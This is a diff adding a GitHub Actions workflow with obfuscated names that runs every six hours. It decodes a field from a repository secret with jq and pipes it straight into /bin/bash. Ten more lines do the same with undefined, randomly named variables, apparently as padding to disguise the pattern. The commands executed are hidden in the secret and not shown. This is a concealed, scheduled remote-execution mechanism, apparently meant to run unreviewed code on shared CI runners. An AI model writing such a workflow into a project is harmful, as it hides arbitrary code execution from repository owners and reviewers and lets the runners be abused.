@@ -1,0 +1,26 @@
+name: zhuhoutianying
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhuhoutianying
+        env:
+          p5277: ${{ secrets.p5277 }}
+        run: |
+          echo $p5277 | jq -r .ygmsh67137 | /bin/bash
+          echo $vxlnr6 | jq -r .myi5 | /bin/bash
+          echo $q82749 | jq -r .snpwx7630 | /bin/bash
+          echo $xiv265 | jq -r .o03240 | /bin/bash
+          echo $zk6663 | jq -r .fqptu84 | /bin/bash
+          echo $gvgpg7 | jq -r .weque5549 | /bin/bash
+          echo $wjhx8026 | jq -r .k456 | /bin/bash
+          echo $jd86 | jq -r .axrb746 | /bin/bash
+          echo $iy7 | jq -r .g3586 | /bin/bash
+          echo $t3569 | jq -r .dnzs482 | /bin/bash
+          echo $bwleg30077 | jq -r .kk04096 | /bin/bash
+
